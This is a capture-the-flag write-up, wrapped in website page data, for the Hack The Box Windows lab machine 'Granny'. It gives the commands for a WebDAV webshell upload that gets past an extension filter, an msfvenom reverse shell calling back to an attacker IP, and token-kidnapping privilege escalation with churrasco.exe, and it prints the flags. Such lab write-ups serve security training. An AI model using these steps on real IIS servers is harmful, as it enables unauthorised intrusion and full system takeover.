__NUXT_JSONP__("/writeups/granny-htb", (function(a,b,c,d,e,f,g,h,i,j,k,l,m,n,o,p,q,r,s,t,u,v,w,x,y,z,A,B,C,D,E,F,G,H,I){return {data:[{article:{slug:"granny-htb",description:"HTB Easy Machine",title:"Granny",img:"\u002Fimages\u002Fwriteups\u002Fgranny\u002Fgranny.png",tags:["easy","windows","webdav",x,y,"windows-exploit-suggester"],toc:[{id:z,depth:v,text:A},{id:B,depth:v,text:C},{id:D,depth:v,text:E},{id:F,depth:v,text:G}],body:{type:H,children:[{type:b,tag:"h1",props:{id:"granny-easy-windows"},children:[{type:b,tag:f,props:{href:"#granny-easy-windows",ariaHidden:l,tabIndex:m},children:[{type:b,tag:n,props:{className:[o,p]},children:[]}]},{type:a,value:"Granny #Easy #Windows"}]},{type:a,value:c},{type:b,tag:e,props:{},children:[{type:a,value:"#web #cadaver #webdav #msfvenom #churrasco #windows-exploit-suggester #nmap"}]},{type:a,value:c},{type:b,tag:e,props:{},children:[{type:b,tag:q,props:{},children:[{type:a,value:"IP"}]},{type:a,value:": 10.10.10.15"}]},{type:a,value:c},{type:b,tag:e,props:{},children:[{type:b,tag:q,props:{},children:[{type:a,value:"Start date"}]},{type:a,value:": [[2022-03-16]]\n"},{type:b,tag:q,props:{},children:[{type:a,value:"Finish date"}]},{type:a,value:": [[2022-03-18]]"}]},{type:a,value:c},{type:b,tag:w,props:{id:z},children:[{type:b,tag:f,props:{href:"#10-enumeration---nmap",ariaHidden:l,tabIndex:m},children:[{type:b,tag:n,props:{className:[o,p]},children:[]}]},{type:a,value:A}]},{type:a,value:c},{type:b,tag:g,props:{className:[h]},children:[{type:b,tag:i,props:{className:[j,k]},children:[{type:b,tag:d,props:{},children:[{type:a,value:"title: `nmap -T5 -p- -n -Pn -sC 10.10.10.15 -oN granny.nmap`\n```python\n80\u002Ftcp open  http\n| http-methods: \n|_  Potentially risky methods: TRACE DELETE COPY MOVE PROPFIND PROPPATCH SEARCH MKCOL LOCK UNLOCK PUT\n|_http-title: Under Construction\n| http-webdav-scan: \n|   Allowed Methods: OPTIONS, TRACE, GET, HEAD, DELETE, COPY, MOVE, PROPFIND, PROPPATCH, SEARCH, MKCOL, LOCK, UNLOCK\n|   Server Type: Microsoft-IIS\u002F6.0\n|   WebDAV type: Unknown\n|   Server Date: Wed, 16 Mar 2022 17:38:18 GMT\n|_  Public Options: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH\n\n"}]}]}]},{type:a,value:c},{type:b,tag:w,props:{id:B},children:[{type:b,tag:f,props:{href:"#11-enumeration---port-80-http",ariaHidden:l,tabIndex:m},children:[{type:b,tag:n,props:{className:[o,p]},children:[]}]},{type:a,value:C}]},{type:a,value:c},{type:b,tag:e,props:{},children:[{type:a,value:"There is port 80 open I run "},{type:b,tag:d,props:{},children:[{type:a,value:"http-enum"}]},{type:a,value:" script from nmap"}]},{type:a,value:c},{type:b,tag:g,props:{className:[h]},children:[{type:b,tag:i,props:{className:[j,k]},children:[{type:b,tag:d,props:{},children:[{type:a,value:"title: `nmap --script=\"http-enum\" 10.10.10.15 -oN granny_httpenum.nmap`\n```python\n\nPORT   STATE SERVICE\n80\u002Ftcp open  http\n| http-enum: \n|   \u002F_vti_bin\u002F: Frontpage file or folder\n|   \u002F_vti_log\u002F: Frontpage file or folder\n|   \u002Fpostinfo.html: Frontpage file or folder\n|   \u002F_vti_bin\u002F_vti_aut\u002Fauthor.dll: Frontpage file or folder\n|   \u002F_vti_bin\u002F_vti_aut\u002Fauthor.exe: Frontpage file or folder\n|   \u002F_vti_bin\u002F_vti_adm\u002Fadmin.dll: Frontpage file or folder\n|   \u002F_vti_bin\u002F_vti_adm\u002Fadmin.exe: Frontpage file or folder\n|   \u002F_vti_bin\u002Ffpcount.exe?Page=default.asp|Image=3: Frontpage file or folder\n|   \u002F_vti_bin\u002Fshtml.dll: Frontpage file or folder\n|   \u002F_vti_bin\u002Fshtml.exe: Frontpage file or folder\n|   \u002Fimages\u002F: Potentially interesting folder\n|_  \u002F_private\u002F: Potentially interesting folder\n\n"}]}]}]},{type:a,value:c},{type:b,tag:e,props:{},children:[{type:a,value:"Crawl website using Burpsuite to find directories."}]},{type:a,value:c},{type:b,tag:e,props:{},children:[{type:a,value:"Wfuzzing website"}]},{type:a,value:c},{type:b,tag:g,props:{className:[h]},children:[{type:b,tag:i,props:{className:[j,k]},children:[{type:b,tag:d,props:{},children:[{type:a,value:"title: `wfuzz -c --hc=404 -w \u002Fusr\u002Fshare\u002Fwordlists\u002Fdirbuster\u002Fdirectory-list-2.3-medium.txt http:\u002F\u002Fgranny.htb\u002FFUZZ`\n\n**Nothing** interesting found\n"}]}]}]},{type:a,value:c},{type:b,tag:e,props:{},children:[{type:a,value:"Found an interesting endpoint which seems to open an Image: "},{type:b,tag:d,props:{},children:[{type:a,value:"granny.htb\u002F_vti_bin\u002Ffpcount.exe?Page=default.asp"}]}]},{type:a,value:c},{type:b,tag:e,props:{},children:[{type:a,value:"From "},{type:b,tag:d,props:{},children:[{type:a,value:"nmap"}]},{type:a,value:" I can see there is a "},{type:b,tag:d,props:{},children:[{type:a,value:"web-dav"}]},{type:a,value:" opened, which is a management tool for website content."}]},{type:a,value:c},{type:b,tag:e,props:{},children:[{type:a,value:"Because there is a web-dav I'll use "},{type:b,tag:d,props:{},children:[{type:a,value:y}]},{type:a,value:" to enter the cli"}]},{type:a,value:c},{type:b,tag:g,props:{className:[h]},children:[{type:b,tag:i,props:{className:[j,k]},children:[{type:b,tag:d,props:{},children:[{type:a,value:"title: `cadaver granny.htb`\n\nIt seems I can put files! So I can download a webshell from `\u002Fusr\u002Fshare\u002Fwebshells\u002Faspx\u002Fcmdasp.aspx`\n\n\nBut because I cannot upload an *.aspx or *.asp I put it as .txt and then move\n`put cmdaspx.txt`\n`move cmdaspx.aspx`\n\nThen I can go to `granny.htb\u002Fcmdx.aspx` and I have a webshell! \n"}]}]}]},{type:a,value:c},{type:b,tag:"h4",props:{id:"20-exploitation---webshell---revshell"},children:[{type:b,tag:f,props:{href:"#20-exploitation---webshell---revshell",ariaHidden:l,tabIndex:m},children:[{type:b,tag:n,props:{className:[o,p]},children:[]}]},{type:a,value:"2.0 Exploitation - Webshell -\u003E revshell"}]},{type:a,value:c},{type:b,tag:e,props:{},children:[{type:a,value:"Because I can upload anything and execute it directly I create a aspx revshell using msfvenom."}]},{type:a,value:c},{type:b,tag:g,props:{className:[h]},children:[{type:b,tag:i,props:{className:[j,k]},children:[{type:b,tag:d,props:{},children:[{type:a,value:"title: `msfvenom -p windows\u002Fshell_reverse_tcp LPORT=6969 LHOST 10.10.14.10 -f aspx -o faye.txt`\n\nCreating a reverse shell `faye.txt` which we will upload using cadaver and executing via website.\n\nAlso I listened with rlwrap\n\n`rlwrap -cAr nc -lvnp 6969`\n\nAnd then I have a revshell as `inetsrv`\n\n"}]}]}]},{type:a,value:c},{type:b,tag:w,props:{id:D},children:[{type:b,tag:f,props:{href:"#3-privilege-escalation---network-service----authoritysystem",ariaHidden:l,tabIndex:m},children:[{type:b,tag:n,props:{className:[o,p]},children:[]}]},{type:a,value:E}]},{type:a,value:c},{type:b,tag:e,props:{},children:[{type:a,value:"Checking the privileges from the "},{type:b,tag:d,props:{},children:[{type:a,value:"network service"}]},{type:a,value:" we see it has "},{type:b,tag:d,props:{},children:[{type:a,value:"SeImpersonatePrivilege"}]},{type:a,value:" enabled and a IIS server running, which means we can perform a "},{type:b,tag:d,props:{},children:[{type:a,value:"Token Kidnapping"}]},{type:a,value:" (which works for Windows Server 200 and IIS 6.0) ("},{type:b,tag:f,props:{href:"https:\u002F\u002Ffoxglovesecurity.com\u002F2016\u002F09\u002F26\u002Frotten-potato-privilege-escalation-from-service-accounts-to-system\u002F",rel:[r,s,t],target:u},children:[{type:a,value:"rotten potato reference"}]},{type:a,value:")"}]},{type:a,value:c},{type:b,tag:g,props:{className:[h]},children:[{type:b,tag:i,props:{className:[j,k]},children:[{type:b,tag:d,props:{},children:[{type:a,value:"title: `whoami \u002Fpriv`\n\n| PRIVILEGES INFORMATION                                                                                                │\n                                       \nPrivilege Name                Description                               State                                         │\nSeAuditPrivilege              Generate security audits                  Disabled                                      │\nSeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled                                      │\nSeAssignPrimaryTokenPrivilege Replace a process level token             Disabled                                      │\nSeChangeNotifyPrivilege       Bypass traverse checking                  Enabled                                       │\n**SeImpersonatePrivilege        Impersonate a client after authentication ==Enabled==**                                       │\nSeCreateGlobalPrivilege       Create global objects                     Enabled  \n \n\n"}]}]}]},{type:a,value:c},{type:b,tag:e,props:{},children:[{type:b,tag:f,props:{href:"https:\u002F\u002Fgithub.com\u002FRe4son\u002FChurrasco\u002Fblob\u002Fmaster\u002FChurrasco.cpp",rel:[r,s,t],target:u},children:[{type:a,value:"Churrasco reference"}]},{type:a,value:c},{type:b,tag:f,props:{href:"https:\u002F\u002Fmedium.com\u002F@nmappn\u002Fwindows-privelege-escalation-via-token-kidnapping-6195edd2660e",rel:[r,s,t],target:u},children:[{type:a,value:"More Churrasco reference"}]},{type:a,value:"\nUsing "},{type:b,tag:d,props:{},children:[{type:a,value:x}]},{type:a,value:", which seems to be an old version of "},{type:b,tag:d,props:{},children:[{type:a,value:"potato's exploit"}]},{type:a,value:" we can steal authority system token an use it to run a new "},{type:b,tag:d,props:{},children:[{type:a,value:"cmd.exe"}]},{type:a,value:"."}]},{type:a,value:c},{type:b,tag:g,props:{className:[h]},children:[{type:b,tag:i,props:{className:[j,k]},children:[{type:b,tag:d,props:{},children:[{type:a,value:"title: `.\\churrasco.exe \"cmd\"`\n\nThis would execute churrasco and using the a high privilege token (authority system) we would run `cmd` which would create a new session with an administrator account. \n"}]}]}]},{type:a,value:c},{type:b,tag:e,props:{},children:[{type:a,value:"All "},{type:b,tag:f,props:{href:"http:\u002F\u002Fnomoreroot.blogspot.com\u002F2008\u002F10\u002Fwindows-2003-poc-exploit-for-token.html",rel:[r,s,t],target:u},children:[{type:a,value:"potato's exploits"}]}]},{type:a,value:c},{type:b,tag:e,props:{},children:[{type:b,tag:q,props:{},children:[{type:a,value:"Flags"}]},{type:a,value:c},{type:b,tag:q,props:{},children:[{type:a,value:"user"}]},{type:a,value:"\n700c5dc163014e22b3e408f8703f67d1"}]},{type:a,value:c},{type:b,tag:e,props:{},children:[{type:b,tag:q,props:{},children:[{type:a,value:H}]},{type:a,value:"\naa4beed1c0584445ab463a6747bd06e9"}]},{type:a,value:c},{type:b,tag:w,props:{id:F},children:[{type:b,tag:f,props:{href:"#x-extra-windows-exploit-suggester",ariaHidden:l,tabIndex:m},children:[{type:b,tag:n,props:{className:[o,p]},children:[]}]},{type:a,value:G}]},{type:a,value:c},{type:b,tag:e,props:{},children:[{type:a,value:"#windows-exploit-suggester"}]},{type:a,value:c},{type:b,tag:e,props:{},children:[{type:a,value:"There are many ways to exploit this machine once we have a webshell. An easy way to check for potential vulnerabilities is using the tool "},{type:b,tag:d,props:{},children:[{type:a,value:"windows-exploit-suggest"}]},{type:a,value:" ("},{type:b,tag:f,props:{href:"https:\u002F\u002Fgithub.com\u002FAonCyberLabs\u002FWindows-Exploit-Suggester",rel:[r,s,t],target:u},children:[{type:a,value:"github here"}]},{type:a,value:") which compares a targets patch levels agains the Microsoft vulnerability database in order to detect potential missing patches on the target."}]},{type:a,value:c},{type:b,tag:e,props:{},children:[{type:a,value:"First we create a database file "},{type:b,tag:d,props:{},children:[{type:a,value:"python2 .\u002Fwindows-exploit-suggester --upgrade"}]},{type:a,value:". Then we can pass the file created along with the system info file."}]},{type:a,value:c},{type:b,tag:e,props:{},children:[{type:a,value:"We can get the system info from executin "},{type:b,tag:d,props:{},children:[{type:a,value:"systeminfo \u003E\u003E system.info"}]}]},{type:a,value:c},{type:b,tag:g,props:{className:[h]},children:[{type:b,tag:i,props:{className:[j,k]},children:[{type:b,tag:d,props:{},children:[{type:a,value:"title: `python2.7 .\u002Fwindows-exploit-suggester.py --database 2022-03-17-mssb.xls --systeminfo system.info`\n\nThe following images displays the granny system vulnerability check output, a very extensive one let me say.\n\n![[windows-exploit-suggester_0.png]]\n\n![[windows-exploit-suggester_1.png]]\n\n\n"}]}]}]}]},dir:"\u002Fwriteups",path:"\u002Fwriteups\u002Fgranny-htb",extension:".md",createdAt:I,updatedAt:I}}],fetch:{},mutations:void 0}}("text","element","\n","code","p","a","div","nuxt-content-highlight","pre","language-text","line-numbers","true",-1,"span","icon","icon-link","strong","nofollow","noopener","noreferrer","_blank",3,"h3","churrasco","cadaver","10-enumeration---nmap","1.0 Enumeration - Nmap","11-enumeration---port-80-http","1.1 Enumeration - Port 80 HTTP","3-privilege-escalation---network-service----authoritysystem","3 Privilege escalation - network service -\u003E  authority\\system","x-extra-windows-exploit-suggester","X Extra: Windows-Exploit Suggester","root","2022-07-08T13:15:28.303Z")));